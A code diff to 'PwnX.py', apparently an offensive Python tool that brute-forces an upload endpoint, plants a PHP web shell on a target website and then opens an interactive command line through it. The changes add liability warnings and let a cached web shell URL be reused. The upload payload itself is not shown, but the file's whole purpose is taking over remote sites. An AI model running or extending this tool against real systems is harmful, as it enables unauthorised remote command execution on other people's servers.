@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 # Title: PwnX.py, formerly known as VulnX
 # Author: cs (@KaliLincox on Twitter)
 # Date: 03/07/2020, remastered 26/02/2021
@@ -22,6 +24,11 @@ def main():
         colorama.init(convert=True)
 
     Banner.print()
+    
+    Logger.warning('use with caution. you are responsible for your actions')
+    Logger.warning('developer assume no liability and are not responsible for any misuse or damage')
+
+    Logger.empty_line()
 
     parser = argparse.ArgumentParser(usage='%(prog)s [options]')
     parser.error = Logger.error
@@ -55,14 +62,17 @@ def main():
 
     Logger.success('target is online')
 
-    url = args.url
-    field_name = args.field_name
-    secret = args.secret
-    form_name = args.form_name
+    cached_shell_url = Cache.get(args.url) if args.cache_enabled else None
 
-    cache_data = Cache.get(url) if args.cache_enabled else None
+    if cached_shell_url is not None:
+        Logger.info('shell url fetched from cache')
+        shell_url = cached_shell_url['shell_url']
+    else:
+        url = args.url
+        field_name = args.field_name
+        secret = args.secret
+        form_name = args.form_name
 
-    if cache_data is None:
         if args.brute_endpoint:
             if args.verbose:
                 Logger.info('brute forcing endpoint...')
@@ -115,9 +125,6 @@ def main():
             shell_url = Exploit.upload_shell(url, form_name, secret, field_name, args.verbose, args.cache_enabled)  # program will exit if an error occurs (shell_url cannot be None)
         except Exception:
             Logger.error(f'an error occurred while attempting to upload php web shell on target site')
-    else:
-        Logger.info('shell url fetched from cache')
-        shell_url = cache_data['shell_url']
 
     Shell.command_line(shell_url)
 
